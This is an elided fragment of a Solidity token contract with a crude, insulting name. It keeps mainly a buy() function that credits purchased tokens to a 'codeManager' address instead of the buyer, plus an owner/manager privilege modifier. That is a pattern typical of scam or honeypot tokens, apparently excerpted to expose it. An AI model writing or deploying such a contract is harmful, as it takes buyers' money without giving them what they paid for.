...
contract FUCK4CHAN {
    ...
    string public name = "FUCK 4CHAN";
    string public symbol = "FK4CHAN";
    ...
    constructor(address _codeManager) {
        owner = msg.sender;
    ...
    function buy() public payable {
        ...
        if (buyFee > 0) {
            ...
            balanceOf[codeManager] = balanceOf[codeManager].add(amountAfterFee);
            emit Transfer(address(this), codeManager, amountAfterFee);
            ...
            balanceOf[codeManager] = balanceOf[codeManager].add(amount);
            emit Transfer(address(this), codeManager, amount);
        }
    }
    ...
    modifier onlyAuthorized() {
        require(
            msg.sender == owner || msg.sender == codeManager,
